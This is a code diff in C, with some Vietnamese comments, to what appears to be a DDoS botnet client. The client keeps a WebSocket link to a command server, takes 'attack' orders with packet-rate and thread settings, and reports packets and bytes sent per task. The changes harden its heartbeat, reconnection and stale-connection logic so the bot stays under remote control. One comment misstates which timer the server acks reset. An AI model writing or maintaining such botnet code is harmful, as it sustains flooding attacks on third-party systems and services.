@@ -153,38 +153,57 @@ int main(int argc, char *argv[])
         ws_send(&ws, hs);
 
         time_t last_hb = time(NULL);
+        time_t last_recv = time(NULL);
         AttackParams atk = {0};
         int cpu_usage = 0;
+        int hb_fail = 0;
 
         while (!g_shutdown)
         {
-            if (time(NULL) - last_hb >= cfg.heartbeat_int)
+            /* Send heartbeat every interval — use real elapsed time,
+               not tied to ws_recv blocking. */
+            time_t now = time(NULL);
+            if (now - last_hb >= cfg.heartbeat_int)
             {
                 cpu_usage = get_cpu_usage();
                 char hb[256];
-                snprintf(hb, sizeof(hb), "{\"type\":\"heartbeat\",\"timestamp\":%ld,\"cpu_usage\":%d}", time(NULL), cpu_usage);
-                ws_send(&ws, hb);
-                last_hb = time(NULL);
-
-                if (g_attack_active && g_cur_task_id[0])
-                {
-                    unsigned long long pkts = g_pkt_count;
-                    unsigned long long bytes = g_byte_count;
-                    char stats[512];
-                    snprintf(stats, sizeof(stats),
-                             "{\"type\":\"attack_stats\",\"task_id\":\"%s\",\"packets_sent\":%llu,\"bytes_sent\":%llu}",
-                             g_cur_task_id, pkts, bytes);
-                    ws_send(&ws, stats);
+                snprintf(hb, sizeof(hb), "{\"type\":\"heartbeat\",\"timestamp\":%ld,\"cpu_usage\":%d}", (long)now, cpu_usage);
+                if (ws_send(&ws, hb) > 0) {
+                    last_hb = now;
+                    hb_fail = 0;
+                } else {
+                    hb_fail++;
+                    if (hb_fail > 3) break;  /* WS dead — reconnect */
                 }
+            }
+
+            /* Send attack stats periodically if attacking */
+            if (g_attack_active && g_cur_task_id[0])
+            {
+                unsigned long long pkts = g_pkt_count;
+                unsigned long long bytes = g_byte_count;
+                char stats[512];
+                snprintf(stats, sizeof(stats),
+                         "{\"type\":\"attack_stats\",\"task_id\":\"%s\",\"packets_sent\":%llu,\"bytes_sent\":%llu}",
+                         g_cur_task_id, pkts, bytes);
+                ws_send(&ws, stats);
             }
 
             char buf[4096];
             int n = ws_recv(&ws, buf, sizeof(buf));
             if (n < 0) {
-                if (time(NULL) - last_hb > cfg.stale_timeout) break;
-                usleep(100000);
+                /* ws_recv trả -1 khi timeout (30s) hoặc lỗi thật.
+                   Server im lặng là bình thường (chỉ gửi khi có lệnh).
+                   Chỉ reconnect nếu KHÔNG nhận gì trong 5 phút. */
+                if (time(NULL) - last_recv > 300) {
+                    break;  /* thật sự stale — reconnect */
+                }
+                usleep(200000);
                 continue;
             }
+
+            /* Nhận được frame → reset timer */
+            last_recv = time(NULL);
 
             char type[64] = {0};
             json_str(buf, "type", type, sizeof(type));
@@ -203,6 +222,9 @@ int main(int argc, char *argv[])
                 }
                 if (pps > 0) cfg.default_pps = pps;
                 if (th > 0) cfg.default_threads = th;
+            }
+            else if (!strcmp(type, "heartbeat_ack") || !strcmp(type, "connected") || !strcmp(type, "pong")) {
+                /* Server alive signal — just resets last_hb (already done above) */
             }
             else if (!strcmp(type, "attack")) {
                 memset(&atk, 0, sizeof(atk));
